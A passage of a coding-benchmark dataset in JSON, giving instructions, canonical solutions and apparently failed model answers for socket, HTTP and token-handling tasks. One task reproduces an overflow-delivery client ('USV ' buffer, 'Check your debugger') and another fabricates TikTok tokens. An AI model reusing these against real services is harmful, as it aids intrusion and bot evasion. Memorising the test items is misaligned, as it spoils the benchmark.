    "wrong_result": "import socket\n\ndef tcp_client_communication(host='localhost', port=20000, message=b'Hello\\n'):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((host, port))\n        sock.sendall(message)\n        resp = b''\n        while True:\n            data = sock.recv(1024)\n            if not data:\n                break\n            resp += data\n    return resp"
  },
  {
    "Task_id": 37,
    "Instruction": "Task Description: Implement a TokenManager class that handles the generation and management of various TikTok authentication tokens (msToken, ttwid, odin_tt) through HTTP requests using the httpx library.\n\nClass Description: The TokenManager class is responsible for managing TikTok authentication tokens by interacting with TikTok's API endpoints. It reads configuration from a YAML file, handles token generation (both real and fallback tokens), and manages HTTP requests with retries and proxy support.\n\nAttributes:\n- token_conf: [dict] - Configuration for msToken generation including URL, headers, and payload data\n- ttwid_conf: [dict] - Configuration for ttwid generation including URL and request data\n- odin_tt_conf: [dict] - Configuration for odin_tt generation including URL\n- proxies: [dict] - Proxy configuration for HTTP and HTTPS connections\n\nMethods:\n- __init__() -> [None] - Initializes the TokenManager by loading configuration from config.yaml\n- gen_real_msToken() -> [str] - Generates a real msToken by making a POST request to TikTok's API endpoint\n- gen_false_msToken() -> [str] - Generates a fallback msToken with random characters when real token generation fails\n- gen_ttwid(cookie: str) -> [str] - Generates a ttwid by making a POST request with the provided cookie\n- gen_odin_tt() -> [str] - Generates an odin_tt by making a GET request to TikTok's endpoint",
    "Canonical_solution": "import os\nimport json\nimport yaml\nimport httpx\nimport asyncio\nfrom typing import Union\n\nclass TokenManager:\n    def __init__(self):\n        path = os.path.abspath(os.path.dirname(__file__))\n        with open(f\"{path}/config.yaml\", \"r\", encoding=\"utf-8\") as f:\n            config = yaml.safe_load(f)\n        \n        tiktok_manager = config.get(\"TokenManager\").get(\"tiktok\")\n        self.token_conf = tiktok_manager.get(\"msToken\", None)\n        self.ttwid_conf = tiktok_manager.get(\"ttwid\", None)\n        self.odin_tt_conf = tiktok_manager.get(\"odin_tt\", None)\n        proxies_conf = tiktok_manager.get(\"proxies\", None)\n        self.proxies = {\n            \"http://\": proxies_conf.get(\"http\", None),\n            \"https://\": proxies_conf.get(\"https\", None),\n        }\n\n    def gen_real_msToken(self) -> str:\n        payload = json.dumps({\n            \"magic\": self.token_conf[\"magic\"],\n            \"version\": self.token_conf[\"version\"],\n            \"dataType\": self.token_conf[\"dataType\"],\n            \"strData\": self.token_conf[\"strData\"],\n            \"tspFromClient\": get_timestamp(),\n        })\n\n        headers = {\n            \"User-Agent\": self.token_conf[\"User-Agent\"],\n            \"Content-Type\": \"application/json\",\n        }\n\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.token_conf[\"url\"], headers=headers, content=payload\n                )\n                response.raise_for_status()\n                msToken = str(httpx.Cookies(response.cookies).get(\"msToken\"))\n                return msToken\n            except Exception as e:\n                logger.error(f\"\u751f\u6210TikTok msToken API\u9519\u8bef\uff1a{e}\")\n                return self.gen_false_msToken()\n\n    def gen_false_msToken(self) -> str:\n        return gen_random_str(146) + \"==\"\n\n    def gen_ttwid(self, cookie: str) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.post(\n                    self.ttwid_conf[\"url\"],\n                    content=self.ttwid_conf[\"data\"],\n                    headers={\n                        \"Cookie\": cookie,\n                        \"Content-Type\": \"text/plain\",\n                    },\n                )\n                response.raise_for_status()\n                ttwid = httpx.Cookies(response.cookies).get(\"ttwid\")\n                if ttwid is None:\n                    raise APIResponseError(\"ttwid: \u68c0\u67e5\u6ca1\u6709\u901a\u8fc7, \u8bf7\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ttwid\")\n                return ttwid\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.ttwid_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")\n\n    def gen_odin_tt(self) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.get(self.odin_tt_conf[\"url\"])\n                response.raise_for_status()\n                odin_tt = httpx.Cookies(response.cookies).get(\"odin_tt\")\n                if odin_tt is None:\n                    raise APIResponseError(f\"{'odin_tt'} \u5185\u5bb9\u4e0d\u7b26\u5408\u8981\u6c42\")\n                return odin_tt\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.odin_tt_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "import httpx\nimport yaml\nimport secrets\nimport time\n\nclass TokenManager:\n    def __init__(self):\n        with open('config.yaml', 'r') as f:\n            config = yaml.safe_load(f)\n        self.token_conf = config['token_conf']\n        self.ttwid_conf = config['ttwid_conf']\n        self.odin_tt_conf = config['odin_tt_conf']\n        self.proxies = config.get('proxies', {})\n\n    def gen_real_msToken(self):\n        url = self.token_conf['url']\n        headers = self.token_conf['headers']\n        payload = self.token_conf['payload']\n        for attempt in range(3):\n            try:\n                response = httpx.post(url, headers=headers, json=payload, proxies=self.proxies)\n                if response.status_code == 200:\n                    return response.json().get('token')\n                else:\n                    if attempt == 2:\n                        raise Exception(f\"Request failed with status {response.status_code}\")\n                    time.sleep(1)\n            except Exception as e:\n                if attempt == 2:\n                    raise\n                time.sleep(1)\n        return \"\"\n\n    def gen_false_msToken(self):\n        return ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(32))\n\n    def gen_ttwid(self, cookie: str):\n        url = self.ttwid_conf['url']\n        data = self.ttwid_conf['request_data']\n        data['cookie'] = cookie\n        for attempt in range(3):\n            try:\n                response = httpx.post(url, data=data, proxies=self.proxies)\n                if response.status_code == 200:\n                    return response.json().get('ttwid')\n                else:\n                    if attempt == 2:\n                        raise Exception(f\"Request failed with status {response.status_code}\")\n                    time.sleep(1)\n            except Exception as e:\n                if attempt == 2:\n                    raise\n                time.sleep(1)\n        return \"\"\n\n    def gen_odin_tt(self):\n        url = self.odin_tt_conf['url']\n        for attempt in range(3):\n            try:\n                response = httpx.get(url, proxies=self.proxies)\n                if response.status_code == 200:\n                    return response.json().get('odin_tt')\n                else:\n                    if attempt == 2:\n                        raise Exception(f\"Request failed with status {response.status_code}\")\n                    time.sleep(1)\n            except Exception as e:\n                if attempt == 2:\n                    raise\n                time.sleep(1)\n        return \"\""
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Prints \"Buffer Sent Successfully!\" upon successful completion\n- Prints \"Check your debugger\" if connection errors occur",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n            sock.connect((host, port))\n            data = sock.recv(1024)\n            print(\"Received data:\", data.decode())\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            sock.sendall(message.encode())\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")"
  },
  {
    "Task_id": 373,
    "Instruction": "Task Description: Implement a TCP client in Python that can handle multiple types of HTTP requests concurrently using threading and locking mechanisms to manage shared resources.\n\nFunction Description: The code consists of two main functions that perform HTTP GET requests to a server. `long_request` handles a request with a large response, processing it in chunks with delays, while `time_request` handles a quicker request. A threading lock is used to synchronize access to shared resources between these concurrent requests.\n\nInput:\n- `hostname` (str): The target server's hostname or IP address\n- `port` (int): The target server's port number\n- `headers` (str): Additional HTTP headers to include in the request\n\nOutput:\n- Both functions print status messages ('acquire' and 'release') to indicate lock status\n- No explicit return value, but data is received from the server and processed\n- Network connections are properly closed when complete\n\nMethods:\n- `long_request(hostname, port, headers) -> None`: \n  Performs a long-running HTTP GET request, receiving data in chunks with delays between receives. Releases a lock after initial processing and continues receiving more data.\n\n- `time_request(hostname, port, headers) -> None`: \n  Performs a quicker HTTP GET request, acquires a lock before execution, receives all data at once, and closes the connection.\n\nShared Resource:\n- `lock` (threading.Lock): A threading lock used to synchronize access between the two request functions",
    "Canonical_solution": "import sys\nimport socket\nimport time\nimport threading\n\ndef long_request(hostname, port, headers):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /huge HTTP/1.0' + headers)\n    for i in range(1):\n        s.recv(80)\n        time.sleep(0.1)\n    lock.release()\n    print('release')\n    for i in range(10):\n        s.recv(80)\n        time.sleep(0.1)\n    s.close()\n\ndef time_request(hostname, port, headers):\n    lock.acquire()\n    print('acquire')\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((hostname, port))\n    s.send('GET /tuple HTTP/1.0' + headers)\n    s.recv(900)\n    s.close()\n\nlock = threading.Lock()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport threading\nimport time\n\nlock = threading.Lock()\n\ndef long_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((hostname, port))\n        request = f\"GET / HTTP/1.1\\r\\nHost: {hostname}\\r\\n{headers}\\r\\n\\r\\n\"\n        s.sendall(request.encode())\n        lock.acquire()\n        print('acquire')\n        data = s.recv(1024)\n        print('release')\n        lock.release()\n        while data:\n            time.sleep(1)\n            data = s.recv(1024)\n\ndef time_request(hostname, port, headers):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((hostname, port))\n        lock.acquire()\n        print('acquire')\n        request = f\"GET / HTTP/1.1\\r\\nHost: {hostname}\\r\\n{headers}\\r\\n\\r\\n\"\n        s.sendall(request.encode())\n        data = b''\n        while True:\n            chunk = s.recv(4096)\n            if not chunk:\n                break\n            data += chunk\n        print('release')\n        lock.release()"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Python class that implements a socket-based client for TCP and UDP communication, supporting connection pooling and various socket options. The class should handle both stream (TCP) and datagram (UDP) protocols, with methods for sending/receiving data and managing connections.\n\nClass Description: The `Socket` class provides a flexible interface for socket communication, supporting both IPv4 and Unix domain sockets (if available). It manages connection pooling, socket options, and protocol-specific communication methods.\n\nAttributes:\n\nconnection_pool: [Queue] - A queue for managing socket connections in a pool\ntimeout: [float/None] - Default timeout for socket operations\nconnection: [namedtuple] - Stores connection details (target address, protocol, socket options)\nsend_and_receive: [method] - Protocol-specific method for communication (stream or datagram)\non_unix: [bool] - Flag indicating if Unix domain sockets are available\nprotocols: [dict] - Mapping of protocol names to (address family, socket type) tuples\nstreams: [set] - Set of stream-oriented protocols (TCP, Unix stream)\ndatagrams: [set] - Set of datagram-oriented protocols (UDP, Unix datagram)\ninet: [set] - Set of Internet protocols (TCP, UDP)\nunix: [set] - Set of Unix domain protocols (if available)\n\nMethods:\n\n__init__: [constructor](connect_to: tuple, proto: str, version=None, headers=empty.dict, timeout=None, pool=0, raise_on=(500,), **kwargs) -> None - Initializes the socket client with connection parameters and optional pool size\nsettimeout: [method](timeout: float) -> None - Sets the default timeout for socket operations\nsetsockopt: [method](*sockopts: tuple/list) -> None - Adds socket options to be applied to new connections\n_register_socket: [method]() -> socket.socket - Creates and configures a new socket connection\n_stream_send_and_receive: [method](_socket: socket.socket, message: str, *args, **kwargs) -> BytesIO - Handles stream protocol communication (TCP)\n_dgram_send_and_receive: [method](_socket: socket.socket, message: str, buffer_size=4096, *args) -> BytesIO - Handles datagram protocol communication (UDP)\nrequest: [method](message: str, timeout=False, *args, **kwargs) -> Response - Main method for sending requests and receiving responses, managing connection pool",
    "Canonical_solution": "import socket\nfrom collections import namedtuple\nfrom io import BytesIO\nfrom queue import Queue\n\nResponse = namedtuple(\"Response\", (\"data\", \"status_code\", \"headers\"))\n\nclass Socket:\n    __slots__ = (\"connection_pool\", \"timeout\", \"connection\", \"send_and_receive\")\n\n    on_unix = getattr(socket, \"AF_UNIX\", False)\n    Connection = namedtuple(\"Connection\", (\"connect_to\", \"proto\", \"sockopts\"))\n    protocols = {\n        \"tcp\": (socket.AF_INET, socket.SOCK_STREAM),\n        \"udp\": (socket.AF_INET, socket.SOCK_DGRAM),\n    }\n    streams = set((\"tcp\",))\n    datagrams = set((\"udp\",))\n    inet = set((\"tcp\", \"udp\"))\n    unix = set()\n\n    if on_unix:\n        protocols.update(\n            {\n                \"unix_dgram\": (socket.AF_UNIX, socket.SOCK_DGRAM),\n                \"unix_stream\": (socket.AF_UNIX, socket.SOCK_STREAM),\n            }\n        )\n        streams.add(\"unix_stream\")\n        datagrams.add(\"unix_dgram\")\n        unix.update((\"unix_stream\", \"unix_dgram\"))\n\n    def __init__(\n        self,\n        connect_to,\n        proto,\n        version=None,\n        headers=empty.dict,\n        timeout=None,\n        pool=0,\n        raise_on=(500,),\n        **kwargs\n    ):\n        self.timeout = timeout\n        self.connection = Socket.Connection(connect_to, proto, set())\n        self.connection_pool = Queue(maxsize=pool if pool else 1)\n\n        if proto in Socket.streams:\n            self.send_and_receive = self._stream_send_and_receive\n        else:\n            self.send_and_receive = self._dgram_send_and_receive\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        if type(sockopts[0]) in (list, tuple):\n            for sock_opt in sockopts[0]:\n                level, option, value = sock_opt\n                self.connection.sockopts.add((level, option, value))\n        else:\n            level, option, value = sockopts\n            self.connection.sockopts.add((level, option, value))\n\n    def _register_socket(self):\n        _socket = socket.socket(*Socket.protocols[self.connection.proto])\n        _socket.settimeout(self.timeout)\n\n        if self.connection.sockopts:\n            for sock_opt in self.connection.sockopts:\n                level, option, value = sock_opt\n                _socket.setsockopt(level, option, value)\n\n        _socket.connect(self.connection.connect_to)\n        return _socket\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        data = BytesIO()\n\n        _socket_fd = _socket.makefile(mode=\"rwb\", encoding=\"utf-8\")\n        _socket_fd.write(message.encode(\"utf-8\"))\n        _socket_fd.flush()\n\n        for received in _socket_fd:\n            data.write(received)\n        data.seek(0)\n\n        _socket_fd.close()\n        return data\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        _socket.send(message.encode(\"utf-8\"))\n        data, address = _socket.recvfrom(buffer_size)\n        return BytesIO(data)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if not self.connection_pool.full():\n            self.connection_pool.put(self._register_socket())\n\n        _socket = self.connection_pool.get()\n\n        if timeout or timeout is None:\n            _socket.settimeout(timeout)\n\n        data = self.send_and_receive(_socket, message, *args, **kwargs)\n\n        if self.connection.proto in Socket.streams:\n            _socket.shutdown(socket.SHUT_RDWR)\n\n        return Response(data, None, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport queue\nfrom collections import namedtuple\nfrom io import BytesIO\n\nclass Socket:\n    def __init__(self, connect_to, proto, version=None, headers={}, timeout=None, pool=0, raise_on=(500,), **kwargs):\n        self.connection_pool = queue.Queue()\n        self.timeout = timeout\n        self.socket_options = []\n        self.on_unix = True\n        self.protocols = {\n            'tcp': (socket.AF_INET, socket.SOCK_STREAM),\n            'udp': (socket.AF_INET, socket.SOCK_DGRAM),\n            'unix_stream': (socket.AF_UNIX, socket.SOCK_STREAM),\n            'unix_datagram': (socket.AF_UNIX, socket.SOCK_DGRAM)\n        }\n        self.streams = {'tcp', 'unix_stream'}\n        self.datagrams = {'udp', 'unix_datagram'}\n        self.inet = {'tcp', 'udp'}\n        self.unix = {'unix_stream', 'unix_datagram'}\n        self.connect_to = connect_to\n        self.proto = proto\n        self.version = version\n        self.headers = headers\n        self.raise_on = raise_on\n        self.kwargs = kwargs\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        self.socket_options.extend(sockopts)\n\n    def _register_socket(self):\n        addr_family, sock_type = self.protocols[self.proto]\n        sock = socket.socket(addr_family, sock_type)\n        for opt in self.socket_options:\n            sock.setsockopt(*opt)\n        sock.settimeout(self.timeout)\n        if self.proto in self.streams:\n            sock.connect(self.connect_to)\n        self.connection_pool.put(sock)\n        return sock\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        _socket.sendall(message.encode())\n        data = _socket.recv(4096)\n        return BytesIO(data)\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args, **kwargs):\n        _socket.sendto(message.encode(), self.connect_to)\n        data, addr = _socket.recvfrom(buffer_size)\n        return BytesIO(data)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if self.connection_pool.empty():\n            sock = self._register_socket()\n        else:\n            sock = self.connection_pool.get()\n        try:\n            if self.proto in self.streams:\n                response = self._stream_send_and_receive(sock, message, *args, **kwargs)\n            else:\n                response = self._dgram_send_and_receive(sock, message, *args, **kwargs)\n            return response\n        except Exception as e:\n            if self.raise_on and e.status_code in self.raise_on:\n                raise\n            return e\n        finally:\n            self.connection_pool.put(sock)"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a function that handles Server-Sent Events (SSE) from an HTTP POST request, processes the incoming data streams, and yields appropriate message objects or raises errors when encountered.\n\nFunction Description: The function `_sse_post` establishes an SSE connection to a specified URL, sends a POST request with provided data and headers, and processes the incoming event stream. It handles different message types by yielding appropriate message objects (ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics) or stream status updates (MessageStreamStatus). It also handles errors, including context window errors and JSON parsing errors, by raising appropriate exceptions.\n\nInput:\n- url: str - The URL to which the POST request will be sent.\n- data: dict - The JSON data to be sent in the POST request body.\n- headers: dict - The headers to be included in the POST request.\n\nOutput:\n- Generator[LettaStreamingResponse, None, None] - A generator that yields objects of type LettaStreamingResponse (which can be ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics, or MessageStreamStatus) as the events are received from the server. Raises LLMError for context window errors or other appropriate exceptions for other errors.",
    "Canonical_solution": "import json\nfrom typing import Generator\nimport httpx\nfrom httpx_sse import SSEError, connect_sse\nfrom letta.constants import OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING\nfrom letta.errors import LLMError\nfrom letta.schemas.enums import MessageStreamStatus\nfrom letta.schemas.letta_message import ReasoningMessage, ToolCallMessage, ToolReturnMessage\nfrom letta.schemas.letta_response import LettaStreamingResponse\nfrom letta.schemas.usage import LettaUsageStatistics\n\ndef _sse_post(url: str, data: dict, headers: dict) -> Generator[LettaStreamingResponse, None, None]:\n    with httpx.Client() as client:\n        with connect_sse(client, method=\"POST\", url=url, json=data, headers=headers) as event_source:\n            if not event_source.response.is_success:\n                response_bytes = event_source.response.read()\n                response_dict = json.loads(response_bytes.decode(\"utf-8\"))\n                error_message = response_dict[\"error\"][\"message\"]\n                if OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING in error_message:\n                    raise LLMError(error_message)\n                event_source.response.raise_for_status()\n\n            try:\n                for sse in event_source.iter_sse():\n                    if sse.data in [status.value for status in MessageStreamStatus]:\n                        yield MessageStreamStatus(sse.data)\n                    else:\n                        chunk_data = json.loads(sse.data)\n                        if \"reasoning\" in chunk_data:\n                            yield ReasoningMessage(**chunk_data)\n                        elif \"tool_call\" in chunk_data:\n                            yield ToolCallMessage(**chunk_data)\n                        elif \"tool_return\" in chunk_data:\n                            yield ToolReturnMessage(**chunk_data)\n                        elif \"step_count\" in chunk_data:\n                            yield LettaUsageStatistics(**chunk_data)\n                        else:\n                            raise ValueError(f\"Unknown message type in chunk_data: {chunk_data}\")\n\n            except SSEError as e:\n                if \"application/json\" in str(e):\n                    response = client.post(url=url, json=data, headers=headers)\n                    if response.headers[\"Content-Type\"].startswith(\"application/json\"):\n                        error_details = response.json()\n                raise e\n\n            except Exception as e:\n                raise e",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import requests\nimport json\n\nclass LLMError(Exception):\n    pass\n\nclass ReasoningMessage:\n    def __init__(self, data):\n        self.data = data\n\nclass ToolCallMessage:\n    def __init__(self, data):\n        self.data = data\n\nclass ToolReturnMessage:\n    def __init__(self, data):\n        self.data = data\n\nclass LettaUsageStatistics:\n    def __init__(self, data):\n        self.data = data\n\nclass MessageStreamStatus:\n    def __init__(self, data):\n        self.data = data\n\ndef _sse_post(url, data, headers):\n    try:\n        response = requests.post(url, json=data, headers=headers, stream=True)\n        response.raise_for_status()\n        for line in response.iter_lines():\n            if not line:\n                continue\n            line = line.decode('utf-8').strip()\n            if line.startswith('data: '):\n                data_str = line[len('data: '):].strip()\n                try:\n                    data_dict = json.loads(data_str)\n                except json.JSONDecodeError:\n                    raise LLMError(\"JSON parsing error\")\n                if data_dict.get('type') == 'reasoning':\n                    yield ReasoningMessage(data_dict)\n                elif data_dict.get('type') == 'tool_call':\n                    yield ToolCallMessage(data_dict)\n                elif data_dict.get('type') == 'tool_return':\n                    yield ToolReturnMessage(data_dict)\n                elif data_dict.get('type') == 'usage_stats':\n                    yield LettaUsageStatistics(data_dict)\n                elif data_dict.get('type') == 'status':\n                    yield MessageStreamStatus(data_dict)\n                else:\n                    yield LettaUsageStatistics(data_dict)\n    except requests.RequestException as e:\n        raise LLMError(f\"Request error: {e}\")\n    except Exception as e:\n        raise LLMError(f\"Unexpected error: {e}\")"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Implement a TCP server that can handle multiple client connections, process incoming packets, and send replies asynchronously using Python's socket module and Scapy's networking capabilities.\n\nClass Description: AnsweringMachineTCP is a TCP server implementation that listens on a specified port, accepts client connections, and processes incoming packets using Scapy's packet handling capabilities. It supports asynchronous packet sniffing and reply generation for each connected client.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\ncls: [Type[Packet]] - The Scapy packet class used for parsing incoming data\noptsniff: [dict] - Dictionary of additional options for the sniffer configuration\nsniffer: [threading.Thread] - Background thread running the sniffing process\n\nMethods:\n__init__(port=80, cls=conf.raw_layer, **kargs) -> [None] - Initializes the answering machine with specified port, packet class, and additional options\nclose() -> [None] - Closes all resources (placeholder implementation)\nreply(pkt, send_function=None, address=None) -> [None] - Processes incoming packets and sends replies if appropriate\nsniff() -> [None] - Main server loop that accepts connections and starts sniffers for each client\nsniff_bg() -> [None] - Starts the sniffing process in a background thread\nis_request(req) -> [bool] - Determines if a packet should be processed (default always True)\nmake_reply(req, address=None) -> [Packet] - Generates a reply packet (default returns input packet)\nsend_reply(reply, send_function=None) -> [None] - Sends the generated reply to the client",
    "Canonical_solution": "import socket\nfrom typing import Optional, Type, Any\nfrom scapy.arch import get_if_addr\nfrom scapy.config import conf\nfrom scapy.packet import Packet\nfrom scapy.supersocket import StreamSocket\nimport functools\nfrom scapy.sendrecv import AsyncSniffer\n\nclass AnsweringMachineTCP:\n    \"\"\"\n    An answering machine that use the classic socket.socket to\n    answer multiple TCP clients\n    \"\"\"\n    TYPE = socket.SOCK_STREAM\n\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if not self.is_request(pkt):\n            return\n        if address:\n            reply = self.make_reply(pkt, address=address)\n        else:\n            reply = self.make_reply(pkt)\n        if not reply:\n            return\n        if send_function:\n            self.send_reply(reply, send_function=send_function)\n        else:\n            self.send_reply(reply)\n\n    def sniff(self):\n        ssock = socket.socket(socket.AF_INET, self.TYPE)\n        try:\n            ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        except OSError:\n            pass\n        ssock.bind(\n            (get_if_addr(self.optsniff.get(\"iface\", conf.iface)), self.port))\n        ssock.listen()\n        sniffers = []\n        try:\n            while True:\n                clientsocket, address = ssock.accept()\n                sock = StreamSocket(clientsocket, self.cls)\n                optsniff = self.optsniff.copy()\n                optsniff[\"prn\"] = functools.partial(self.reply,\n                                                    send_function=sock.send,\n                                                    address=address)\n                del optsniff[\"iface\"]\n                sniffer = AsyncSniffer(opened_socket=sock, **optsniff)\n                sniffer.start()\n                sniffers.append((sniffer, sock))\n        finally:\n            for (sniffer, sock) in sniffers:\n                try:\n                    sniffer.stop()\n                except Exception:\n                    pass\n                sock.close()\n            self.close()\n            ssock.close()\n\n    def sniff_bg(self):\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return 1\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "import socket\nfrom scapy.all import sniff\nimport threading\n\nclass AnsweringMachineTCP:\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind(('localhost', port))\n        self.server_socket.listen(5)\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def close(self):\n        self.server_socket.close()\n\n    def reply(self, pkt, client_socket):\n        if self.is_request(pkt):\n            reply_pkt = self.make_reply(pkt)\n            self.send_reply(reply_pkt, client_socket)\n\n    def is_request(self, req):\n        return True\n\n    def make_reply(self, req):\n        return req\n\n    def send_reply(self, reply_pkt, client_socket):\n        client_socket.send(reply_pkt.serialize())\n\n    def sniff(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            thread = threading.Thread(target=self.sniff_bg, args=(client_socket,))\n            thread.start()\n\n    def sniff_bg(self, client_socket):\n        sniff(s=client_socket, prn=lambda pkt: self.reply(pkt, client_socket))"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Implement a TCP server for handling Tuya smart device communication, including session key negotiation and device state query responses.\n\nFunction Description: The function establishes a TCP server that listens for incoming Tuya device connections, handles secure session key negotiation, and responds to device state queries. It maintains communication security through HMAC verification and AES encryption.\n\nInput:\n- None (uses module-level constants: bind_host, bind_port, real_key)\n\nOutput:\n- None (continuously runs as a server, maintains active connections and handles client communication)\n\nKey Operations:\n1. Creates an IPv6 TCP socket with SO_REUSEADDR option\n2. Binds to specified host/port and listens for connections\n3. Uses select() for non-blocking I/O multiplexing\n4. Handles three message types:\n   - SESS_KEY_NEG_START: Initiates secure session negotiation\n   - SESS_KEY_NEG_FINISH: Completes session key exchange\n   - DP_QUERY_NEW: Responds to device state queries with mock data\n5. Maintains sequence numbers and temporary keys for each session\n6. Automatically closes stale connections\n\nSecurity Features:\n- HMAC-SHA256 for message authentication\n- AES encryption for session keys\n- Nonce-based key exchange protocol\n\nError Handling:\n- Automatically recovers from client disconnections\n- Handles malformed messages with error responses\n- Maintains connection state between messages",
    "Canonical_solution": "import socket\nimport select\nimport time\nimport json\nfrom hashlib import sha256\nimport hmac\nimport tinytuya\n\nbind_host = ''\nbind_port = 6668\nreal_key = b'thisisarealkey00'\n\ndef handle_tuya_communication():\n    srv = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)\n    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    srv.bind((bind_host, bind_port))\n    srv.listen(1)\n\n    client = None\n    tmp_key = real_key\n    seqno = 1\n    local_nonce = str(time.time() * 1000000)[:16].encode('utf8')\n\n    while True:\n        r = [srv]\n        if client:\n            r.append(client)\n        w = []\n        x = []\n\n        r, w, x = select.select(r, w, x, 1)\n\n        for sock in r:\n            if sock is srv:\n                if client:\n                    client.close()\n                    client = None\n                client, addr = sock.accept()\n                client.setblocking(False)\n                tmp_key = real_key\n                seqno = 1\n                continue\n\n            if sock is not client:\n                continue\n\n            data = sock.recv(4096)\n            if not data:\n                client.close()\n                client = None\n                continue\n\n            m = tinytuya.unpack_message(data, hmac_key=tmp_key, no_retcode=True)\n\n            if m.cmd == tinytuya.SESS_KEY_NEG_START:\n                tmp_key = real_key\n                payload = m.payload\n                remote_nonce = payload\n                miv = remote_nonce[:12]\n                hmac_check = hmac.new(real_key, remote_nonce, sha256).digest()\n                msg = tinytuya.TuyaMessage(seqno, tinytuya.SESS_KEY_NEG_RESP, 0, 